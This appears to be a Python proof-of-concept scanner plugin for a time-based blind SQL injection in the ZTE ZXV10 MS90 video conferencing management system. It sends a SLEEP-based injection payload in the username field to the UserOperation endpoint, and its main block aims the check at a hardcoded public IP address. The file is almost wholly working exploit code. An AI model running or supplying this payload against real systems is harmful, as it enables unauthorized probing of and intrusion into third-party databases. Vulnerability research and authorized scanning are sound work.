#!/usr/bin/env python
# -*- coding: utf-8 -*-

# POC Name  :  ZXV10 MS90视频会议管理系统 通用SQL注入
# Author    :  a
# mail      :  a@lcx.cc

import urlparse
import time

def assign(service, arg):
    if service == 'zte':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    start_time1=time.time()
    data = "username=admin';(SELECT * FROM (SELECT(SLEEP(0)))gByI)#&op=getHint"
    code1, head, res, errcode, _ = curl.curl2(arg,data)
    true_time=time.time()-start_time1
    start_time2=time.time()
    url = arg + 'UserOperation'
    data = "username=admin';(SELECT * FROM (SELECT(SLEEP(5)))gByI)#&op=getHint"
    code2, head, res, errcode, _ = curl.curl2(url ,data)
    flase_time=time.time()-start_time2
    if code1==200 and code2==200 and flase_time>5>true_time:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('zte', 'http://61.184.36.220:9000/')[1])